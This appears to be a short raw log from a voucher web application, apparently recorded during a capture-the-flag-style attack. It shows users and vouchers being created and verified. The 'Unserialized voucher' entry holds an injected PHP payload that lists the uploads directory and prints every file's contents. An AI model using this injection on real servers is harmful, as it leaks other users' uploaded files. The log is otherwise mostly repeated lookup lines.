Nuovo utente cqjql@klwhk.ml
get users vouchers
get users vouchers
Creazione voucher cqjql@klwhk.ml xnzqzxphlkggwck
get users vouchers
Unserialized voucher cqjql@klwhk.ml xnzqzxphlkggwck 
$files1 = array_diff(scandir(getcwd()."/uploads/"), array("..", "."));
echo $files1;
foreach ($files1 as &$value) {
    $x = fopen(getcwd()."/uploads/".$value, "r");
    $y = fread($x, filesize(getcwd()."/uploads/".$value));
    echo $y;
}

Verifica voucher cqjql@klwhk.ml xnzqzxphlkggwck
get users vouchers
get users vouchers
get users vouchers
get users vouchers
get users vouchers
get users vouchers
get users vouchers
get users vouchers
get users vouchers
